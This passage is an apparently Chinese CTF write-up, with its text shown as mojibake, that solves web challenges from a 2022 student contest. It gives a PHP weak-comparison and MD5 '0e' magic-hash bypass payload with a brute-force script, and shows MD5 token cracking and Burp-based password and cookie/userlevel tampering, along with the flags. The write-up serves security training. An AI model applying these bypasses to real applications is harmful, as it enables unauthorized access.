class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>];</span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123;</span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆæ¥çœ‹æœ€åä¸€æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">è¿™é‡Œå­˜åœ¨åˆ¤æ–­ abcdéƒ½è¦ä¸º<span class="number">1</span>ä¹Ÿå°±æ˜¯<span class="literal">true</span>  æ‰å¯ä»¥<span class="keyword">echo</span> flag</span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>];</span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>getä¼ ä¸ªx1 å¹¶ä¸”  $x1==â€1â€?die(â€œha?â€):NULL;  ä¸‰ç›®è¿ç®—ç¬¦ï¼Œè¿™å¥æ„æ€æ˜¯å¦ä¸º1  ä¸º1åˆ™die<br>é‚£æˆ‘ä»¬ä¸ºx1 ä¸º0  switch ä¼šå…ˆç»è¿‡0  æ²¡æœ‰break  æ¥ç€ä¼šcase1 è¿™æ ·  a=1äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123;</span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼ ä¸€ä¸ªjsonæ•°æ®  jsonæ ‡å‡†æ ¼å¼ä¸º<code>&#123;&quot;a&quot;:â€sasdâ€œ,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;</code><br> is_numeric(@$x2[â€œx21â€])?die(â€œha?â€):NULL;  è¿™é‡Œå¿…é¡»ä¸èƒ½æ˜¯çº¯æ•°å­—ä¸”è¦å¤§äº2017ã€æ€ä¹ˆç»•å‘¢<br> is_numericå‡½æ•°æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œä»–ä¼šæŠŠ<code>123asd</code>è¿™ç§å­—ç¬¦ä¸²æ”¹å˜ä¸º 123  ä¹Ÿå°±æ˜¯è¿™ä¹Ÿ(â€˜1234aâ€™ == 1234)ä¸ºçœŸï¼Œä¸”å› phpä¸­å¤§äºå°äºå’Œ==ï¼ˆä¸¤ä¸ªç­‰äºï¼‰æ˜¯ä¸ä¼šåˆ¤æ–­ç±»å‹æ˜¯å¦ç›¸åŒè¿™æ ·çš„è¯ï¼Œå…¶ä¸ºå¼±ç±»å‹æ¯”è¾ƒï¼Œæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå¤§äº2017çš„æ•°åŠ ä¸ªå­—ç¬¦ä¸²å°±è¡Œ  å¦‚  200000aaa  <code>&#123;&quot;x21&quot;:&quot;200000aaa&quot;&#125;</code>è¿™é‡Œæ³¨æ„  jsonå€¼ä¸ºå­—ç¬¦ä¸²æ—¶è¦åŠ åŒå¼•å·<br>è¿˜æœ‰ä¸€ä¸ªx22  x22éœ€è¦ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸”è¦ç­‰äº2ï¼Œcount($x2[â€œx22â€])!==2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">      <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">          <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéå†x22è¿™ä¸ªæ•°ç»„ï¼Œè¦æ±‚ä¸èƒ½å…ƒç´ æ˜¯æœ‰â€XIPUâ€è¿™ä¸ªå­—æ ·ï¼Œä½†æ˜¯è¿˜å¿…é¡»è¦åœ¨æ•°ç»„ä¸­èƒ½å¤Ÿæ‰¾åˆ°ã€‚è¿™é‡Œarray_search()å‡½æ•°æ˜¯å­˜åœ¨å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜çš„ï¼Œå› æ­¤å°†ç¬¬äºŒä¸ªå…ƒç´ è®¾ç½®ä¸º0ï¼Œåœ¨äºâ€XIPUâ€å­—ç¬¦ä¸²æ¯”è¾ƒçš„æ—¶å€™ï¼Œ0==â€XIPUâ€æ˜¯æˆç«‹çš„ã€‚å› ä¸ºxipuä¸­æ²¡æœ‰æ•°å­—ï¼Œæœ€å <code>&#123;&quot;x21&quot;:&quot;200000aaa&quot;,&quot;x22&quot;:[[0],0]&#125;</code><br>ç¬¬ä¸‰éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strstr() å‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å›è¯¥å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å› FALSEã€‚<br>x3ä¸èƒ½ä¸º15562  ä¸”ç©¿çš„å€¼ä¸­è¦æœ‰XIPU,ä¸‹é¢åˆ¤æ–­  15562çš„md5 çš„8-16 ä½è¦å’Œæˆ‘ä»¬ä¼ çš„æ•°ç›¸ç­‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="comment">//45961dd50e46379442318098474e0ced</span></span><br><span class="line"><span class="comment">//0e46379442318098</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ åˆæ˜¯è€ç”Ÿé•¿è°ˆçš„é—®é¢˜   0eæ•°å­—  ä¸”æ¯”è¾ƒçš„æ—¶å€™ä¸º== å¼±ç±»å‹æ¯”è¾ƒä¼šæŠŠ0eæ•°å­—è§£ææˆç§‘å­¦è®¡æ•°æ³•å½¢å¼ä¹Ÿå°±æ˜¯0ï¼Œé‚£æˆ‘ä»¬åªéœ€å†æ‰¾ä¸€ä¸ªè¿™æ ·çš„æ•°å°±è¡Œäº†<br>pythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mohu_md5</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1300000</span>):</span><br><span class="line">        t1 =  <span class="built_in">str</span>(i)+<span class="string">&#x27;XIPU&#x27;</span></span><br><span class="line">        <span class="comment">#t1 =  &#x27;XIPU&#x27;  str(i)+</span></span><br><span class="line">        md5_result = hashlib.md5(t1.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="comment">#print(md5_result)</span></span><br><span class="line">        <span class="keyword">if</span> md5_result[<span class="number">8</span>:<span class="number">10</span>] == <span class="string">&#x27;0e&#x27;</span>:</span><br><span class="line">            j = md5_result[<span class="number">10</span>:<span class="number">24</span>]</span><br><span class="line">            <span class="comment">#isdigit()åˆ¤æ–­æ˜¯å¦ä¸ºçº¯æ•°å­—ï¼Œæ˜¯åˆ™ä¸ºtrue åä¹‹false</span></span><br><span class="line">            <span class="keyword">if</span> j.isdigit():</span><br><span class="line">                <span class="built_in">print</span>(t1 + <span class="string">&quot;-----&gt;&quot;</span>+md5_result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">mohu_md5()</span><br><span class="line"><span class="comment">#XIPU18570-----&gt;026cba5c0e20905432015695e9eb13ba</span></span><br><span class="line"><span class="comment">#47484XIPU-----&gt;373e838b0e191027496067472b89aa6b</span></span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªéƒ½å¯ä»¥<br>æœ€ç»ˆpayload<code>index.php?x1=0&amp;x2=&#123;&quot;x21&quot;:&quot;2018asd&quot;,&quot;x22&quot;:[[0],0]&#125;&amp;x3=47484XIPU</code><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930154508776.png" alt="image-20220930154508776"></p><h4 id="è·³æ¥è·³å»"><a href="#è·³æ¥è·³å»" class="headerlink" title="è·³æ¥è·³å»"></a>è·³æ¥è·³å»</h4><p>150pt (å·²åšå‡º) ç®€å•è¶Šæƒ<br>èµ›é¢˜åœ°å€<code>http://ctftime1.usaas.net/web/good/index.php</code><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930154824375.png" alt="image-20220930154824375"><br>å¼€å±€ç»™äº†test test ç›´æ¥ç™»å½•<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155017429.png" alt="image-20220930155017429"><br>ç‚¹è¿™ä¸ªç™»å½•æˆåŠŸä¼šè·³è½¬åˆ°adminï¼Œä¸”æç¤ºæƒé™ä¸è¶³ï¼Œæ˜¾ç„¶è¦è¿›è¡Œè¶Šæƒï¼ŒæŠ“ä¸ªåŒ…<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155048535.png" alt="image-20220930155048535"><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155158626.png" alt="image-20220930155158626"><br>è¿™è¾¹å¯ä»¥çœ‹åˆ°ä¸€ä¸ªtokenï¼Œtoken=ad0234829205b9033196ba818f7a872b<br>æ˜¾ç„¶æ˜¯md5è¿‡çš„ è§£ä¸€ä¸‹<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155257003.png" alt="image-20220930155257003"><br>è¿™é‡Œä¸ºtest2  æˆ‘ä»¬è¿™é‡Œè‚¯å®šè¦adminçš„md5äº†,ä¸è¿‡ç»è¿‡æµ‹è¯•ä¸æ˜¯  adminçš„ ä¹Ÿè¯•äº†ä¸‹admin2 ä¹Ÿä¸æ˜¯  æœæ–­çˆ†ç ´ ï¼Œå…¶å®æ˜¯admin1çš„md5  å•Šè¿™<br>çˆ†ç ´å°±ä¸è´´äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155701407.png" alt="image-20220930155701407"></p><h3 id="å„ç§æ”¹header"><a href="#å„ç§æ”¹header" class="headerlink" title="å„ç§æ”¹header"></a>å„ç§æ”¹header</h3><p>150pt (å·²åšå‡º) è€ƒç‚¹ï¼šæ”¹åŒ…<br>å¼€å±€ä¸€ä¸ªé»‘æ¡†ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥å¾€å·¦ä¸Šè§’çœ‹  æœ‰ä¸€ä¸ªpassword.txt  é‚£æ˜¾ç„¶æ˜¯çˆ†ç ´äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155942088.png" alt="image-20220930155942088"><br>è®¿é—®ä¹‹  ç›´æ¥å¤åˆ¶ï¼Œè¿™é‡Œä¸ç”¨åœ¨ç”Ÿæˆå¯†ç å­—å…¸æ–‡ä»¶äº†ï¼Œç›´æ¥å¯ä»¥ç²˜è´´ä¸€ä¼šçœ‹ï¼Œéšä¾¿åœ¨å¯†ç å¤„è¾“ç‚¹ä»€ä¹ˆç„¶åæŠ“åŒ…å‘é€åˆ°intruderçˆ†ç ´<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160153027.png" alt="image-20220930160153027"><br>ç‚¹clear åªåŠ passwordè¿™ä¸ªå­—æ®µçš„adminä¸ºå˜é‡ï¼Œç‚¹paylaodï¼Œç›´æ¥ç‚¹pasteå°±æŠŠåˆšåˆšåœ¨å¤åˆ¶é‚£è¾¹çš„å¯†ç ç²˜è´´<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160401337.png" alt="image-20220930160401337"><br>ç‚¹attackå¼€å§‹å°±å¯ä»¥äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160618475.png" alt="image-20220930160618475"></p><p>å¯†ç ä¸ºNsf0cuS æ—¶  å›æ˜¾äº†newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw;è§£ä¸€ä¸‹base64ä¸ºï¼š290bca70c7dae93db6644fa00b9d83b9.php<br>è®¿é—®ä¹‹<code>http://ctftime1.usaas.net/web/header/290bca70c7dae93db6644fa00b9d83b9.php</code><br>æ˜¯ä¸€ä¸ªç•™è¨€æ¿<br>éšä¾¿è¾“ç‚¹ä»€ä¹ˆ<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930161533441.png" alt="image-20220930161533441"></p><p>è¯´æˆ‘æ²¡ç™»å½•  å› ä¸ºè¿™é‡Œæ²¡æœ‰å¯ç™»å½•çš„åœ°æ–¹ï¼Œæœæ–­æŠ“åŒ…</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930161712966.png" alt="image-20220930161712966"><br>è¿™é‡ŒIsLogin=0æ˜¾ç„¶æ˜¯åˆ¤æ–­ç™»é™†äº†æ²¡æœ‰ç›´æ¥æ”¹æˆ1</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930162050828.png" alt="image-20220930162050828"></p><p>ç„¶ååˆè¯´æˆ‘æ²¡æœ‰æƒé™ï¼Œæˆ‘ä»¬çœ‹ä¸‹é¢content=bohemian&amp;userlevel=guest&amp;Submit=%E7%95%99%E8%A8%80<br>userlevel ä¸ºguest æ˜¾ç„¶è¦æ”¹æˆç®¡ç†å‘˜ï¼Œæ¯”èµ›æ—¶è¯•äº†<code>admin admin1 manager administrator</code> éƒ½ä¸æ˜¯,æœæ–­çˆ†ç ´è¿™ä¸ªåœ°æ–¹  æœ€åæ˜¯<code>root</code> å•Šè¿™</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930162139612.png" alt="image-20220930162139612"><br><code>Flag=flag%7Bbbda40bfc4eff921a5f5faf0cfd3c195%7D</code><br><code>Flag=flag&#123;bbda40bfc4eff921a5f5faf0cfd3c195&#125;</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="æ–‡ä»¶ä¿®å¤"><a href="#æ–‡ä»¶ä¿®å¤" class="headerlink" 